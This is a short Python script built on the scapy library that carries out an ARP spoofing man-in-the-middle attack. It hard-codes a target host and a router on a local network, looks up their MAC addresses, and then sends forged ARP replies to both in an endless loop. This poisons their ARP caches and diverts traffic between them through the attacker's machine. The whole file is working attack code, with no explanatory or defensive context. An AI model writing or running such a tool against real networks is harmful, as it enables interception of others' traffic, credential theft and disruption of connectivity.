import time

import scapy.all as scapy

target_ip = '192.168.1.50'
router_ip = '192.168.1.1'

def get_mac(ip, timeout):
    request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    request_broadcast = broadcast / request
    client = scapy.srp(request_broadcast, timeout=timeout, verbose=False)[0][0][1]
    return client.hwsrc

def spoof(target_ip, source_ip):
    target_mac = get_mac(target_ip, 40) #If you get an error change the timeout value
    arp_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = source_ip)
    scapy.send(arp_packet)

while True:
    spoof(target_ip, router_ip)
    spoof(router_ip, target_ip)
    time.sleep(2)
